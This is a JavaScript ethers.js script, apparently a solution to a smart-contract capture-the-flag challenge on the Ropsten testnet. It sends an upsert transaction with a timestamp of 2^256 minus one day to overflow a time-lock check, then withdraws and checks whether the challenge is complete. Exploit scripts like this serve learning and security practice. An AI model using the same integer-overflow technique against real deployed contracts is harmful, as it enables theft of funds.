import {Contract, ethers, utils} from 'ethers';
import { INFURA_ROPSTEN_URL, privateKey, mnemonic } from '../constant.js';

const provider = new ethers.providers.JsonRpcProvider(INFURA_ROPSTEN_URL)
const wallet = new ethers.Wallet(privateKey, provider)
// const wallet = new ethers.Wallet.fromMnemonic(mnemonic).connect(provider)


const contractaddr = "0x96E9cAe8F13F7F86FB43eb56a4EE11364Ae76dE8";
const contractabi = [
    "function upsert(uint256 index, uint256 timestamp) public payable",
    "function isComplete() public view returns (bool) ",
    "function withdraw(uint256 index) public"
]
const contract = new ethers.Contract(contractaddr, contractabi, wallet);

const main = async() =>{


    const max = ethers.BigNumber.from(2n**256n);
    const val = max.sub(ethers.BigNumber.from(24n*60n*60n));
    console.log("val===", val);


    const options1 = {
        value: ethers.utils.parseUnits("1", "wei"),
        gasLimit: 100000
    }


    let tx1 = await contract.upsert(1, val, options1);

    await tx1.wait();
    console.log("第一次成功");

    const options2 = {
        value: ethers.utils.parseUnits("2", "wei"),
        gasLimit: 100000
    }

    let tx2 = await contract.upsert(1, val, options2);
    await tx2.wait();
    console.log(tx2);

    console.log("第二次成功");


    const options3 = {
        value: ethers.utils.parseUnits("2", "wei"),
        gasLimit: 100000
    }

    let tx3 = await contract.upsert(2, 0, options3);
    await tx3.wait();
    console.log(tx3);
    
    console.log("第三次成功");



}
await main();

const todo = async() =>{
    let tx4 = await contract.withdraw(2,{gasLimit: 100000});
    await tx4.wait();
    console.log(tx4);

    console.log("第四次成功");


    console.log("结果为",await contract.isComplete());

    console.log("程序运行结束！！！！！！");

}

todo();

// console.log(2n ** 256n - 86400n);

// 115792089237316195423570985008687907853269984665640564039457584007913129553536